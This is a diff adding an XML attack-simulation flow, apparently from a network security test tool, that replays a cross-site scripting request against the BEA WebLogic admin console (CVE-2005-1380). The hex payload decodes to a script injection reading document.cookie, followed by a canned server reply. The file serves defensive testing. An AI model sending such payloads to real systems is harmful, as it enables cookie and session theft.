@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Flow closetype="client_fin" layer="tcp" name="BEAWeblogic_XSS" type="attack">
+    <MetaData application="base_threats" attackIntent="Unauthorized_Use Implementation_Exploitation" bugtraqId="13400" createDate="10/18/2011" cveId="CVE-2005-1380" description="BEA Weblogic XSS" details="This threat takes advantage of a Cross-Site Scripting attack on BEA's Weblogic Administration Console.  This can be used for stealing cookies and authentication information.  The BEA Administration Console typically listens on port 8001." equipmentType="Application" osvdbId="15895" protocol="HTTP" severity="" vendorsAffected="BEA_Systems"/>
+    <Packets>
+        <Packet name="packet_0" pktDelay="0" tx="client">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>47455420636f6e736f6c652f616374696f6e732f6a6e64692f4a6e64694672616d65736574416374696f6e3f7365727665723d273c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293b3c2f7363726970743e6d79646f6d61696e2533414e616d652533446d79736572766572253243547970652533445320485454502f312e300d0a0d0a</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+		<Packet name="packet_1" pktDelay="0" tx="server">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+    </Packets>
+</Flow>
